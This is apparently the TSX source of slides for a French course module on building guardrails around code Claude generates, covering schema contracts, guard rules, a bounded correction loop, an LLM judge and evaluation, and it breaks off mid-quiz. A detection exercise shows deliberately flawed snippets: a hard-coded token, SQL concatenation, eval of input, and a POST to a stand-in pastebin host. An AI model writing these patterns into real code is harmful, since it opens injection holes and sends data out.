// ─── Module 3 · Harness engineering ─────────────────────────────────────────

const M3_Section: Page = () => (
  <Section n={3} title="Harness engineering" sub="Encadrer, vérifier et évaluer ce que produit Claude : par du code, pas par des promesses." dur="20 min + ateliers 2 h 10" labs={<Tag tone="green" size={20}>Atelier 2 · Harnais et évaluation</Tag>}>
    <SecItem n={1}>Garde-fous probabilistes ou déterministes</SecItem>
    <SecItem n={2}>Les cinq couches d’un harnais</SecItem>
    <SecItem n={3}>La boucle générer → vérifier → corriger</SecItem>
    <SecItem n={4}>Juge LLM et évaluation : mesurer avant d’affirmer</SecItem>
  </Section>
);
M3_Section.transition = BLOOM;

// ─── Deux familles de garde-fous ────────────────────────────────────────────
const M3_Familles: Page = () => (
  <Frame mod={3} beats={1}>
    <Title>Deux familles de garde-fous</Title>
    <Lede>Une consigne dans le prompt <em>réduit</em> un risque. Un contrôle par du code le <em>supprime</em>, pour ce qu’il sait détecter.</Lede>
    <div style={{ position: 'absolute', left: 120, top: 262, width: 1680, display: 'grid', gridTemplateColumns: 'repeat(2, minmax(0, 1fr))', gap: 30 }}>
      <div className={A.left} style={{ background: C.card, borderRadius: 20, boxShadow: SHADOW, padding: '24px 30px', borderTop: `8px solid ${C.yellow}` }}>
        <div style={{ display: 'flex', alignItems: 'center', gap: 16 }}>
          <IconTile name="chat" tone="yellow" size={56} solid />
          <div>
            <div style={{ fontFamily: display, fontWeight: 800, fontSize: 30, color: C.navy }}>Probabilistes</div>
            <div style={{ fontSize: 20, color: C.muted }}>le modèle est prié de…</div>
          </div>
        </div>
        <div style={{ marginTop: 18, display: 'flex', flexDirection: 'column', gap: 12 }}>
          <Bullet size={23}>Consignes, interdits, rôle dans le système</Bullet>
          <Bullet size={23}>Exemples de bon et de mauvais code</Bullet>
          <Bullet size={23}>Juge LLM qui note selon une grille</Bullet>
        </div>
        <div style={{ marginTop: 18 }}>
          <Tag tone="yellow" size={20}>
            Utile, souple, jamais sûr à 100 %
          </Tag>
        </div>
      </div>
      <div className={A.right} style={{ background: C.card, borderRadius: 20, boxShadow: SHADOW, padding: '24px 30px', borderTop: `8px solid ${C.green}`, ...dl(150) }}>
        <div style={{ display: 'flex', alignItems: 'center', gap: 16 }}>
          <IconTile name="shieldCheck" tone="green" size={56} solid />
          <div>
            <div style={{ fontFamily: display, fontWeight: 800, fontSize: 30, color: C.navy }}>Déterministes</div>
            <div style={{ fontSize: 20, color: C.muted }}>le code vérifie que…</div>
          </div>
        </div>
        <div style={{ marginTop: 18, display: 'flex', flexDirection: 'column', gap: 12 }}>
          <Bullet size={23}>Schéma JSON, types, validation stricte</Bullet>
          <Bullet size={23}>Tests, linter, analyse statique, règles « garde »</Bullet>
          <Bullet size={23}>Permissions et hooks qui bloquent une action</Bullet>
        </div>
        <div style={{ marginTop: 18 }}>
          <Tag tone="green" size={20}>
            Rigide, mais vrai à chaque exécution
          </Tag>
        </div>
      </div>
    </div>
    <div style={{ position: 'absolute', left: 120, top: 700, width: 1680 }}>
      <Callout tone="navy" icon="scale" title="La règle de décision" size={25} cls={b.on(1)}>
        Ce qui doit être vrai <strong>à chaque fois</strong> (pas de secret, JSON valide, tests verts) passe par du code. Ce qui relève du <strong>jugement</strong> (lisibilité, pertinence) passe par
        une consigne, un juge, puis un humain.
      </Callout>
    </div>
  </Frame>
);

// ─── Les cinq couches ───────────────────────────────────────────────────────
const M3Layer = ({ n, tone, icon, title, ex, catches, w }: { n: number; tone: Tone; icon: IconName; title: string; ex: ReactNode; catches: string; w: number }) => (
  <div className={b.on(n)} style={{ display: 'grid', gridTemplateColumns: `${w}px minmax(0, 1fr)`, gap: 26, alignItems: 'center' }}>
    <div style={{ marginLeft: (1040 - w) / 2, width: w, height: 84, borderRadius: 16, background: STRONG[tone], color: '#fff', display: 'flex', alignItems: 'center', gap: 16, padding: '0 22px', boxSizing: 'border-box', boxShadow: SHADOW_SM }}>
      <Icon name={icon} size={32} color="#fff" sw={2.3} />
      <div>
        <div style={{ fontFamily: display, fontWeight: 800, fontSize: 24 }}>
          {n}. {title}
        </div>
        <div style={{ fontSize: 18, opacity: 0.9 }}>{ex}</div>
      </div>
    </div>
    <div style={{ fontSize: 21, color: C.soft, lineHeight: 1.35 }}>
      <strong style={{ color: C.ink }}>Attrape : </strong>
      {catches}
    </div>
  </div>
);

const M3_Couches: Page = () => (
  <Frame mod={3} beats={5}>
    <Title>Les cinq couches d’un harnais</Title>
    <Lede>Aucune couche n’est parfaite ; empilées, leurs trous ne s’alignent pas. Du plus automatique au plus humain :</Lede>
    <div style={{ position: 'absolute', left: 120, top: 262, width: 1680, display: 'flex', flexDirection: 'column', gap: 14 }}>
      <M3Layer n={1} tone="navy" icon="code" title="Contrat" ex="schéma JSON, types, signatures" catches="la forme : champs manquants, types faux, valeurs hors liste" w={1040} />
      <M3Layer n={2} tone="blue" icon="lock" title="Contraintes" ex="outils permis, règles métier, données délimitées" catches="ce que le modèle n’a pas le droit de faire ou de décider" w={960} />
      <M3Layer n={3} tone="green" icon="shieldCheck" title="Vérification automatique" ex="tests, linter, garde, analyse statique" catches="les défauts connus, à chaque exécution, sans fatigue" w={880} />
      <M3Layer n={4} tone="violet" icon="scale" title="Juge LLM" ex="grille notée, sortie structurée" catches="ce qui demande du jugement : architecture, clarté, pertinence" w={800} />
      <M3Layer n={5} tone="pink" icon="humanCheck" title="Humain" ex="revue, décision, signature" catches="le contexte que personne n’a écrit, et la responsabilité" w={720} />
    </div>
  </Frame>
);

// ─── Le contrat ─────────────────────────────────────────────────────────────
const M3_Contrat: Page = () => (
  <Frame mod={3}>
    <Title>Couche 1 · le contrat sert trois fois</Title>
    <Lede>Un seul fichier de schéma, écrit une fois, utilisé par le modèle, par le code et par les tests.</Lede>
    <div style={{ position: 'absolute', left: 120, top: 262, width: 900 }}>
      <CodeDark file="contrats/demande.schema.json (extrait)" size={19} cls={A.left}>
        {'{'}
        {'\n'}  <Cs>"type"</Cs>: <Cs>"object"</Cs>,
        {'\n'}  <Cs>"additionalProperties"</Cs>: <Cn>false</Cn>,
        {'\n'}  <Cs>"required"</Cs>: [<Cs>"type"</Cs>, <Cs>"priorite"</Cs>, <Cs>"client"</Cs>, <Cs>"resume"</Cs>],
        {'\n'}  <Cs>"properties"</Cs>: {'{'}
        {'\n'}    <Cs>"type"</Cs>: {'{'} <Cs>"enum"</Cs>: [<Cs>"incident"</Cs>, <Cs>"evolution"</Cs>, <Cs>"devis"</Cs>, <Cs>"question"</Cs>] {'}'},
        {'\n'}    <Cs>"priorite"</Cs>: {'{'} <Cs>"enum"</Cs>: [<Cs>"P1"</Cs>, <Cs>"P2"</Cs>, <Cs>"P3"</Cs>] {'}'},
        {'\n'}    <Cs>"client"</Cs>: {'{'} <Cs>"type"</Cs>: <Cs>"string"</Cs> {'}'},
        {'\n'}    <Cs>"telephone"</Cs>: {'{'} <Cs>"type"</Cs>: [<Cs>"string"</Cs>, <Cs>"null"</Cs>] {'}'},
        {'\n'}    <Cs>"utilisateurs_touches"</Cs>: {'{'} <Cs>"type"</Cs>: [<Cs>"integer"</Cs>, <Cs>"null"</Cs>] {'}'},
        {'\n'}    <Cs>"resume"</Cs>: {'{'} <Cs>"type"</Cs>: <Cs>"string"</Cs> {'}'}
        {'\n'}  {'}'}
        {'\n'}{'}'}
      </CodeDark>
    </div>
    <div style={{ position: 'absolute', left: 1080, top: 262, width: 720, display: 'flex', flexDirection: 'column', gap: 18 }}>
      <Row2 icon="sparkles" tone="blue" title="Au modèle" d={200}>
        dans <Ic>output_config.format</Ic> (API) ou <Ic>--json-schema</Ic> (claude -p)
      </Row2>
      <Row2 icon="code" tone="navy" title="Au code" d={300}>
        validation stricte à la réception : validerDemande, dans chacune des 4 stacks
      </Row2>
      <Row2 icon="flask" tone="green" title="Aux tests" d={400}>
        chaque cas de référence est validé contre le même schéma
      </Row2>
      <Callout tone="yellow" icon="alert" title="Pas de priorité « libre »" size={22} cls={A.in} style={dl(550)}>
        Une énumération fermée (P1, P2, P3) se vérifie. Un texte libre (« très urgent ») ne se vérifie pas.
      </Callout>
    </div>
  </Frame>
);

// ─── La garde : trouver le défaut ───────────────────────────────────────────
const M3Snip = ({ n, rule, children }: { n: number; rule: string; children: ReactNode }) => (
  <div style={{ display: 'grid', gridTemplateColumns: 'minmax(0, 1fr) 330px', gap: 18, alignItems: 'center' }}>
    <CodeDark size={19}>{children}</CodeDark>
    <div className={b.pop(n)} style={{ display: 'flex', alignItems: 'center', gap: 10, background: T.coral.bg, color: T.coral.fg, borderRadius: 12, padding: '10px 14px', fontFamily: mono, fontWeight: 700, fontSize: 19, boxShadow: `inset 0 0 0 2px ${T.coral.bd}` }}>
      <Icon name="x" size={22} color={T.coral.fg} sw={3} /> {rule}
    </div>
  </div>
);

const M3_Garde: Page = () => (
  <Frame mod={3} kind="exercice" beats={4}>
    <Title>Couche 3 · qu’est-ce que la garde doit bloquer ?</Title>
    <Lede>Quatre extraits générés par un agent pressé. Dites-moi le défaut de chacun ; je révèle la règle qui l’attrape.</Lede>
    <div style={{ position: 'absolute', left: 120, top: 262, width: 1680, display: 'flex', flexDirection: 'column', gap: 16 }}>
      <M3Snip n={1} rule="secret-en-dur">
        <Ck>const</Ck> NOTION_TOKEN = <Cs>"ntn_51b2f…a9"</Cs>;
      </M3Snip>
      <M3Snip n={2} rule="sql-concatene">
        db.<Cf>exec</Cf>(<Cs>`SELECT * FROM demandes WHERE client = '</Cs>${'{'}client{'}'}<Cs>'`</Cs>);
      </M3Snip>
      <M3Snip n={3} rule="execution-dynamique">
        <Ck>const</Ck> regle = <Cf>eval</Cf>(demande.formule_priorite);
      </M3Snip>
      <M3Snip n={4} rule="reseau-non-prevu">
        <Ck>await</Ck> <Cf>fetch</Cf>(<Cs>"https://pastebin.example/upload"</Cs>, {'{'} method: <Cs>"POST"</Cs>, body {'}'});
      </M3Snip>
    </div>
    <div className={A.fade} style={{ position: 'absolute', left: 120, top: 830, width: 1680, display: 'flex', alignItems: 'center', gap: 12, fontSize: 21, color: C.muted, ...dl(500) }}>
      <Icon name="terminal" size={24} color={C.electric} /> <Ic>node guichet.mjs garde</Ic> lit les règles de <Ic>garde/regles.json</Ic>, analyse le code de votre stack et sort en erreur au premier défaut.
    </div>
  </Frame>
);

// ─── Une sortie qui se réinjecte ────────────────────────────────────────────
const M3_GardeSortie: Page = () => (
  <Frame mod={3}>
    <Title>Une bonne vérification parle au modèle</Title>
    <Lede>Le message d’erreur est la moitié du garde-fou : précis, localisé, avec la correction attendue. Il sera renvoyé tel quel à Claude.</Lede>
    <div style={{ position: 'absolute', left: 120, top: 262, width: 1680, display: 'grid', gridTemplateColumns: 'repeat(2, minmax(0, 1fr))', gap: 30 }}>
      <div>
        <Eyebrow c={T.coral.fg} size={19} style={{ marginBottom: 10 }}>
          Inutilisable
        </Eyebrow>
        <CodeDark file="sortie" size={21} cls={A.left}>
          <span style={{ color: '#FF8A8A' }}>Erreur : le code n’est pas conforme.</span>
          {'\n'}<span style={{ color: '#8A8A98' }}>Process exited with code 1</span>
        </CodeDark>
      </div>
      <div>
        <Eyebrow c={T.green.fg} size={19} style={{ marginBottom: 10 }}>
          Réinjectable
        </Eyebrow>
        <CodeDark file="node guichet.mjs garde" size={19} cls={A.right} style={dl(200)}>
          <span style={{ color: '#FF8A8A' }}>✗ sql-concatene</span> src/depot/sqlite.ts:42
          {'\n'}  Requête construite par concaténation.
          {'\n'}  <span style={{ color: '#9BE29B' }}>Attendu :</span> requête paramétrée, db.prepare(sql).run(params)
          {'\n'}<span style={{ color: '#FF8A8A' }}>✗ secret-en-dur</span> src/config.ts:7
          {'\n'}  Jeton littéral « ntn_… ».
          {'\n'}  <span style={{ color: '#9BE29B' }}>Attendu :</span> lire NOTION_TOKEN depuis l’environnement
          {'\n'}<span style={{ color: '#8A8A98' }}>2 défauts · code de sortie 2</span>
        </CodeDark>
      </div>
    </div>
    <div style={{ position: 'absolute', left: 120, top: 660, width: 1680, display: 'grid', gridTemplateColumns: 'repeat(3, minmax(0, 1fr))', gap: 24 }}>
      <Card icon="map" tone="blue" title="Où" size={22} pad={22} cls={A.in} style={dl(400)}>
        fichier et ligne : le modèle corrige au bon endroit
      </Card>
      <Card icon="flag" tone="navy" title="Quelle règle" size={22} pad={22} cls={A.in} style={dl(500)}>
        un nom stable : on peut compter, suivre, désactiver en connaissance de cause
      </Card>
      <Card icon="checkCircle" tone="green" title="Ce qui est attendu" size={22} pad={22} cls={A.in} style={dl(600)}>
        la correction, pas seulement le reproche
      </Card>
    </div>
  </Frame>
);

// ─── La boucle ──────────────────────────────────────────────────────────────
const M3Node = ({ x, y, icon, tone, title, sub, cls, d = 0 }: { x: number; y: number; icon: IconName; tone: Tone; title: string; sub: string; cls?: string; d?: number }) => (
  <div className={cls ?? A.pop} style={{ position: 'absolute', left: x, top: y, width: 300, display: 'flex', flexDirection: 'column', alignItems: 'center', textAlign: 'center', gap: 8, ...dl(d) }}>
    <IconTile name={icon} tone={tone} size={76} solid />
    <div style={{ fontSize: 24, fontWeight: 700, color: C.ink }}>{title}</div>
    <div style={{ fontSize: 19, color: C.muted, lineHeight: 1.3 }}>{sub}</div>
  </div>
);

const M3_Boucle: Page = () => (
  <Frame mod={3} beats={3}>
    <Title>La boucle générer → vérifier → corriger</Title>
    <Lede>Le harnais ne se contente pas de refuser : il renvoie l’erreur et laisse une chance de corriger. Avec une limite.</Lede>
    <svg width={1100} height={600} style={{ position: 'absolute', left: 120, top: 260 }} aria-hidden>
      <path d="M 300 110 H 640" stroke={C.faint} strokeWidth={4} fill="none" strokeDasharray="2 10" strokeLinecap="round" className={A.march} />
      <path d="M 790 200 C 790 330 790 330 650 400" stroke={C.coral} strokeWidth={4} fill="none" pathLength={1} className={b.draw(1)} />
      <path d="M 300 400 C 160 380 150 260 150 200" stroke={C.coral} strokeWidth={4} fill="none" pathLength={1} className={b.draw(1)} />
    </svg>
    <M3Node x={120} y={270} icon="sparkles" tone="blue" title="Générer" sub="claude -p + prompt + retours" d={100} />
    <M3Node x={760} y={270} icon="shieldCheck" tone="navy" title="Vérifier" sub="garde, tests, schéma" d={250} />
    <M3Node x={440} y={580} icon="loop" tone="coral" title="Corriger" sub="les erreurs exactes, pas « recommence »" cls={b.pop(1)} />
    <div style={{ position: 'absolute', left: 1260, top: 262, width: 540, display: 'flex', flexDirection: 'column', gap: 18 }}>
      <Card icon="checkCircle" tone="green" title="Tout est vert" size={22} pad={22} cls={b.on(2)}>
        On garde le code, on journalise le nombre de tours.
      </Card>
      <Card icon="alert" tone="coral" title="3 tours sans succès" size={22} pad={22} cls={b.on(3)}>
        On s’arrête et on escalade vers un humain, avec l’historique. Une boucle sans limite brûle du temps et des jetons.
      </Card>
      <Callout tone="blue" icon="bulb" title="Ce que fait Claude Code" size={22} cls={b.on(3)} style={dl(150)}>
        Exactement cette boucle, quand un hook lance les tests après chaque modification (Module 5).
      </Callout>
    </div>
  </Frame>
);

// ─── La boucle en code ──────────────────────────────────────────────────────
const M3_BoucleCode: Page = () => (
  <Frame mod={3} kind="exercice">
    <Title>À compléter : la boucle de l’étape A2.3</Title>
    <Lede>Trois trous. Dites-moi ce qu’on y met.</Lede>
    <LangTabs initial="TS" cls={A.in} style={{ position: 'absolute', left: 120, top: 250, width: 1140 }}>
      <div style={{ display: 'flex', gap: 10, marginBottom: 14 }}>
        <LangBtn lang="TS" />
        <LangBtn lang="Java" />
      </div>
      <LangPane lang="TS">
        <CodeDark file="ts/src/outils/boucle.ts" size={20}>
          <Ck>export async function</Ck> <Cf>boucle</Cf>(tache: <Ck>string</Ck>, maxTours = <Cn>3</Cn>) {'{'}
          {'\n'}  <Ck>let</Ck> retours = <Cs>''</Cs>;
          {'\n'}  <Ck>for</Ck> (<Ck>let</Ck> tour = <Cn>1</Cn>; tour {'<='} maxTours; tour++) {'{'}
          {'\n'}    <Ck>await</Ck> <Cf>generer</Cf>(tache, retours);<Cc>{'        // claude -p'}</Cc>
          {'\n'}    <Ck>const</Ck> r = <Ck>await</Ck> <Cf>verifier</Cf>();<Cc>{'            // garde + tests'}</Cc>
          {'\n'}    <Ck>if</Ck> (<Hole>condition</Hole>) <Ck>return</Ck> {'{'} ok: <Cn>true</Cn>, tour {'}'};
          {'\n'}    retours = <Hole>quoi renvoyer</Hole>;
          {'\n'}  {'}'}
          {'\n'}  <Ck>return</Ck> {'{'} ok: <Cn>false</Cn>, <Hole>pour l’humain</Hole> {'}'};
          {'\n'}{'}'}
        </CodeDark>
      </LangPane>
      <LangPane lang="Java">
        <CodeDark file="java/src/main/java/guichet/outils/Boucle.java" size={19}>
          <Ck>public</Ck> Resultat <Cf>boucle</Cf>(String tache, <Ck>int</Ck> maxTours) {'{'}
          {'\n'}  String retours = <Cs>""</Cs>;
          {'\n'}  <Ck>for</Ck> (<Ck>int</Ck> tour = <Cn>1</Cn>; tour {'<='} maxTours; tour++) {'{'}
          {'\n'}    generateur.<Cf>generer</Cf>(tache, retours);
          {'\n'}    Verification r = verificateur.<Cf>verifier</Cf>();
          {'\n'}    <Ck>if</Ck> (<Hole>condition</Hole>) <Ck>return</Ck> Resultat.<Cf>ok</Cf>(tour);
          {'\n'}    retours = <Hole>quoi renvoyer</Hole>;
          {'\n'}  {'}'}
          {'\n'}  <Ck>return</Ck> Resultat.<Cf>echec</Cf>(<Hole>pour l’humain</Hole>);
          {'\n'}{'}'}
        </CodeDark>
      </LangPane>
    </LangTabs>
    <div style={{ position: 'absolute', left: 1320, top: 304, width: 480, display: 'flex', flexDirection: 'column', gap: 20 }}>
      <Card icon="flask" tone="green" title="Le test qui juge" size={22} pad={22} cls={A.right} style={dl(200)}>
        Un générateur simulé qui réussit au tour 2 : la boucle doit s’arrêter au tour 2. Un qui échoue toujours : 3 tours, puis échec.
      </Card>
      <Callout tone="blue" icon="bulb" title="Indice" size={22} cls={A.right} style={dl(350)}>
        Ce qu’on renvoie, c’est la sortie de la garde et des tests, pas un résumé.
      </Callout>
    </div>
  </Frame>
);

// ─── Le juge LLM ────────────────────────────────────────────────────────────
const M3_Juge: Page = () => (
  <Frame mod={3} beats={2}>
    <Title>Couche 4 · le juge LLM : utile, à condition de le juger</Title>
    <Lede>Pour ce qu’un test ne sait pas voir (architecture, clarté, pertinence d’un résumé), un modèle note selon une grille que vous écrivez.</Lede>
    <div style={{ position: 'absolute', left: 120, top: 262, width: 820 }}>
      <CodeDark file="prompts/juge.md (extrait)" size={19} wrap cls={A.left}>
        Tu relis du code pour l’équipe Guichet. Note chaque critère de 1 à 4, avec une phrase de justification qui cite le code.
        {'\n\n'}<Ck>{'<grille>'}</Ck>
        {'\n'}1. Séparation des couches : pas d’accès base dans l’API
        {'\n'}2. Erreurs : aucune exception avalée en silence
        {'\n'}3. Nommage : métier en français, cohérent avec src/domaine
        {'\n'}4. Testabilité : dépendances injectées
        {'\n'}<Ck>{'</grille>'}</Ck>
        {'\n\n'}Réponds selon le schéma contrats/verdict.schema.json.
      </CodeDark>
    </div>
    <div style={{ position: 'absolute', left: 1000, top: 262, width: 800, display: 'flex', flexDirection: 'column', gap: 18 }}>
      <Card icon="alert" tone="coral" title="Ses biais connus" size={22} pad={22} cls={b.on(1)}>
        Il préfère les réponses longues, la première option présentée, et parfois son propre style. Il peut être convaincu par un commentaire du code jugé.
      </Card>
      <Card icon="scale" tone="violet" title="Le calibrer" size={22} pad={22} cls={b.on(2)}>
        Sur 20 à 30 cas, comparez ses notes aux vôtres. Pas d’accord ? On corrige la grille, pas le code. Ensuite seulement on lui fait confiance… et on revérifie de temps en temps.
      </Card>
      <Callout tone="navy" icon="shield" title="Ce qu’il ne garantit pas" size={22} cls={b.on(2)} style={dl(150)}>
        La sécurité ni la justesse : un juge accompagne la garde et les tests, il ne les remplace pas.
      </Callout>
    </div>
  </Frame>
);

// ─── Évaluer ────────────────────────────────────────────────────────────────
const M3Cell = ({ v, tone }: { v: string; tone: Tone }) => (
  <span style={{ display: 'inline-block', minWidth: 90, textAlign: 'center', fontFamily: mono, fontWeight: 700, fontSize: 22, color: T[tone].fg, background: T[tone].bg, borderRadius: 8, padding: '4px 10px' }}>{v}</span>
);

const M3_Eval: Page = () => (
  <Frame mod={3} beats={2}>
    <Title>Évaluer avant d’affirmer</Title>
    <Lede>« Ça a l’air mieux » n’est pas un résultat. Un jeu de cas de référence figé, un score par champ, et on compare les versions.</Lede>
    <div className={A.in} style={{ position: 'absolute', left: 120, top: 262, width: 1080, background: C.card, borderRadius: 20, boxShadow: SHADOW, padding: '20px 26px' }}>
      <PanelTitle icon="chart">node guichet.mjs eval · 12 demandes de référence</PanelTitle>
      <div style={{ display: 'grid', gridTemplateColumns: '300px repeat(4, minmax(0, 1fr))', rowGap: 14, alignItems: 'center', fontSize: 21, color: C.ink, marginTop: 8 }}>
        <span style={{ color: C.muted }}>Champ</span>
        <span style={{ color: C.muted, textAlign: 'center' }}>v1 · Haiku</span>
        <span style={{ color: C.muted, textAlign: 'center' }}>v3 · Haiku</span>
        <span style={{ color: C.muted, textAlign: 'center' }}>v3 · Sonnet</span>
        <span style={{ color: C.muted, textAlign: 'center' }}>Δ</span>
        <span>type</span>
        <span style={{ textAlign: 'center' }}><M3Cell v="9/12" tone="yellow" /></span>
        <span style={{ textAlign: 'center' }}><M3Cell v="12/12" tone="green" /></span>
        <span style={{ textAlign: 'center' }}><M3Cell v="12/12" tone="green" /></span>
        <span style={{ textAlign: 'center', color: C.muted }}>=</span>
        <span>priorité</span>
        <span style={{ textAlign: 'center' }}><M3Cell v="6/12" tone="coral" /></span>
        <span style={{ textAlign: 'center' }}><M3Cell v="10/12" tone="yellow" /></span>
        <span style={{ textAlign: 'center' }}><M3Cell v="11/12" tone="green" /></span>
        <span style={{ textAlign: 'center', color: C.muted }}>+1</span>
        <span>téléphone E.164</span>
        <span style={{ textAlign: 'center' }}><M3Cell v="8/12" tone="yellow" /></span>
        <span style={{ textAlign: 'center' }}><M3Cell v="12/12" tone="green" /></span>
        <span style={{ textAlign: 'center' }}><M3Cell v="12/12" tone="green" /></span>
        <span style={{ textAlign: 'center', color: C.muted }}>=</span>
        <span>injection ignorée (n° 11)</span>
        <span style={{ textAlign: 'center' }}><M3Cell v="0/1" tone="coral" /></span>
        <span style={{ textAlign: 'center' }}><M3Cell v="1/1" tone="green" /></span>
        <span style={{ textAlign: 'center' }}><M3Cell v="1/1" tone="green" /></span>
        <span style={{ textAlign: 'center', color: C.muted }}>=</span>
        <span>temps moyen</span>
        <span style={{ textAlign: 'center', fontFamily: mono }}>3,1 s</span>
        <span style={{ textAlign: 'center', fontFamily: mono }}>3,4 s</span>
        <span style={{ textAlign: 'center', fontFamily: mono }}>6,8 s</span>
        <span style={{ textAlign: 'center', color: C.muted }}>×2</span>
      </div>
      <div style={{ marginTop: 14, fontSize: 18, color: C.muted }}>Chiffres d’illustration : vous mesurez les vôtres à l’étape A2.5.</div>
    </div>
    <div style={{ position: 'absolute', left: 1260, top: 262, width: 540, display: 'flex', flexDirection: 'column', gap: 18 }}>
      <Card icon="lock" tone="navy" title="Figer le jeu" size={22} pad={22} cls={b.on(1)}>
        On ne retire jamais un cas raté. On en ajoute quand la production en révèle un nouveau.
      </Card>
      <Card icon="target" tone="green" title="Lire le Δ" size={22} pad={22} cls={b.on(2)}>
        Ici, Sonnet gagne 1 cas sur la priorité pour un temps doublé. Le prompt v3 a rapporté bien plus que le changement de modèle.
      </Card>
    </div>
  </Frame>
);

// ─── Atelier 2 ──────────────────────────────────────────────────────────────
const M3_A2: Page = () => (
  <LabPage
    mod={3}
    n="2"
    title="Harnais : contrat, garde, boucle, juge"
    defi="harnais"
    who="Individuel"
    minutes={90}
    objective={
      <>
        Construire autour de l’extraction un harnais qui <strong>refuse</strong> ce qui est mal formé, <strong>bloque</strong> le code dangereux, <strong>fait corriger</strong> automatiquement, et
        <strong> note</strong> l’architecture.
      </>
    }
    where={
      <>
        <Ic>contrats/demande.schema.json</Ic>
        <br />
        <Ic>garde/regles.json</Ic> (2 règles ajoutées)
        <br />
        la boucle de votre stack
        <br />
        <Ic>prompts/juge.md</Ic>
      </>
    }
    crit={
      <>
        <CheckItem id="a2c1" size={21}>
          Une extraction invalide est rejetée avec un message clair
        </CheckItem>
        <CheckItem id="a2c2" size={21}>
          garde attrape les 4 extraits de garde/cas/
        </CheckItem>
        <CheckItem id="a2c3" size={21}>
          verifier A2.3 et A2.4 au vert
        </CheckItem>
      </>
    }
    suivi="Points d’étape à 13 h 15, 13 h 40 et 14 h 05 : « A2.1, A2.2, A2.3 ou A2.4 ? »"
  >
    <WStep n="2.1">Compléter le schéma ; extraire 3 cas avec MOTEUR=claude-cli ; valider côté code.</WStep>
    <WStep n="2.2">Ajouter les règles sql-concatene et execution-dynamique à la garde.</WStep>
    <WStep n="2.3">Compléter la boucle générer → vérifier → corriger, 3 tours au plus.</WStep>
    <WStep n="2.4">Écrire la grille du juge, l’appliquer à 2 fichiers, comparer à votre avis.</WStep>
  </LabPage>
);

const M3_A2Etapes: Page = () => (
  <Frame mod={3} kind="lab">
    <Title>Atelier 2 · les étapes et leurs points de reprise</Title>
    <Lede>Énoncé complet dans <Ic>ateliers/A2.md</Ic>. Une étape réussie : <Ic>node guichet.mjs verifier A2.x</Ic>.</Lede>
    <div style={{ position: 'absolute', left: 120, top: 250, width: 1680, display: 'flex', flexDirection: 'column', gap: 14 }}>
      <LabStep id="A2.1" title="Le contrat" min={20} d={100}>
        Complétez les énumérations et les champs requis ; <Ic>extraire --cas 3 --moteur claude-cli</Ic> ; la validation rejette le cas n° 12 (incomplet) avec un message lisible.
      </LabStep>
      <LabStep id="A2.2" title="La garde" min={25} d={200}>
        Deux règles à écrire dans <Ic>garde/regles.json</Ic> ; chaque règle a un nom, un motif, un message et la correction attendue ; <Ic>garde --cas</Ic> doit tout attraper.
      </LabStep>
      <LabStep id="A2.3" title="La boucle" min={30} d={300}>
        Complétez la boucle de votre stack ; <Ic>boucle taches/tronquer-resume.md</Ic> : combien de tours ? Lisez ce que la garde a renvoyé.
      </LabStep>
      <LabStep id="A2.4" title="Le juge" min={15} d={400}>
        Grille de 4 critères ; <Ic>juger src/pipeline</Ic> ; notez vous-même les 2 fichiers et comparez vos notes à celles du juge.
      </LabStep>
    </div>
  </Frame>
);

const M3_Pause: Page = () => <BreakPage mod={3} title="Pause" back="Dix minutes. Ensuite : la mini-évaluation, 40 minutes." minutes={10} />;

const M3_A2Eval: Page = () => (
  <LabPage
    mod={3}
    n="2 bis"
    title="Mini-évaluation"
    defi="eval"
    who="Individuel"
    minutes={40}
    objective={
      <>
        Mesurer votre prompt d’extraction sur les <strong>12 demandes de référence</strong>, comparer deux versions et deux modèles, et décider sur des chiffres.
      </>
    }
    where={
      <>
        <Ic>eval/rapport.md</Ic> (généré)
        <br />
        votre décision en 3 lignes en bas du rapport
      </>
    }
    crit={
      <>
        <CheckItem id="a25c1" size={21}>
          4 mesures : v1 et v3, Haiku et Sonnet
        </CheckItem>
        <CheckItem id="a25c2" size={21}>
          Les échecs de la meilleure version sont expliqués
        </CheckItem>
        <CheckItem id="a25c3" size={21}>
          Aucun cas retiré du jeu de référence
        </CheckItem>
      </>
    }
    suivi="Point d’étape à 14 h 50 : « Combien de mesures avez-vous ? »"
  >
    <WStep n="2.5">
      <Ic>eval --prompt extraction.v1 --modele haiku</Ic>, puis v3, puis Sonnet.
    </WStep>
    <WStep n="+">Ouvrez le détail des cas ratés : erreur du prompt, des règles, ou du jeu ?</WStep>
    <WStep n="+">Corrigez une seule chose, re-mesurez, notez le Δ.</WStep>
    <TpBonus>Ajoutez un 13ᵉ cas qui piège votre meilleure version, et gardez-le dans le jeu.</TpBonus>
  </LabPage>
);

const M3_Restit: Page = () => (
  <Frame mod={3} kind="synthese">
    <Title>Atelier 2 · restitution</Title>
    <Lede>Deux ou trois volontaires, 2 minutes chacun : votre rapport d’évaluation et une règle de garde qui vous a surpris.</Lede>
    <div className={A.in} style={{ position: 'absolute', left: 120, top: 262, width: 1000, background: C.card, borderRadius: 20, boxShadow: SHADOW, padding: '24px 30px' }}>
      <PanelTitle icon="chart">Ce qu’on regarde ensemble</PanelTitle>
      <div style={{ display: 'flex', flexDirection: 'column', gap: 14, marginTop: 6 }}>
        <Bullet size={24}>Combien de tours la boucle a-t-elle pris ? Qu’a dit la garde ?</Bullet>
        <Bullet size={24}>Le juge était-il d’accord avec vous ? Sur quel critère pas ?</Bullet>
        <Bullet size={24}>Qu’a rapporté le plus : changer le prompt ou changer le modèle ?</Bullet>
        <Bullet size={24}>La demande n° 11 (injection) : qui l’a laissée passer ?</Bullet>
      </div>
    </div>
    <div style={{ position: 'absolute', left: 1180, top: 262, width: 620, display: 'flex', flexDirection: 'column', gap: 20 }}>
      <Timer id="restit-a2" minutes={8} label="Restitution A2" cls={A.right} style={dl(200)} />
      <Callout tone="green" icon="bulb" title="À retenir" size={23} cls={A.right} style={dl(350)}>
        Contraindre, vérifier, boucler, mesurer : le modèle peut se tromper, le système autour ne laisse pas passer l’erreur.
      </Callout>
    </div>
  </Frame>
);

// ─── QCM du Jour 1 ──────────────────────────────────────────────────────────
const M3_Qcm: Page = () => (
  <Frame mod={3} kind="qcm">
    <Title>QCM du Jour 1</Title>
    <QuizSeries y={190}>
      <QuizQ q="Le code généré ne doit jamais contenir de secret. Le garde-fou adapté :" explain="Ce qui doit être vrai à chaque fois passe par du code : une règle de garde ou un hook qui bloque. Une consigne réduit le risque sans le supprimer.">
        <QOpt>une consigne ferme dans le prompt système</QOpt>
        <QOpt ok>une règle déterministe (garde, hook) qui bloque</QOpt>
        <QOpt>un juge LLM qui relit chaque fichier</QOpt>
        <QOpt>des exemples de code sans secret</QOpt>
      </QuizQ>
